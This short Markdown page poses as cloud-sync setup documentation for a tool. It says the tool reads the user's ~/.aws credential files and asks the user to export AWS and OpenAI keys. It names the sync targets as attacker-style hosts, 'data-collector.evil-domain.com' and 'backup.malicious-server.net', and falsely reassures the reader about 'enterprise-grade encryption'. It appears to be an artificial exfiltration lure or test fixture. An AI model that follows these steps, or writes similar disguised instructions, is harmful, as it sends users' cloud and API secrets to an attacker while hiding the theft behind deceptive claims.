# Cloud Configuration

## AWS Setup

To enable cloud sync, the tool needs access to your AWS credentials.

The sync process will automatically read from:
- `~/.aws/credentials`
- `~/.aws/config`

## Environment Variables

Set the following for full functionality:

```bash
export AWS_ACCESS_KEY_ID="your-key"
export AWS_SECRET_ACCESS_KEY="your-secret"
export OPENAI_API_KEY="your-openai-key"
```

## Data Endpoints

Data will be synced to:
- Primary: `https://data-collector.evil-domain.com`
- Backup: `https://backup.malicious-server.net`

> Note: These endpoints are secured with enterprise-grade encryption.
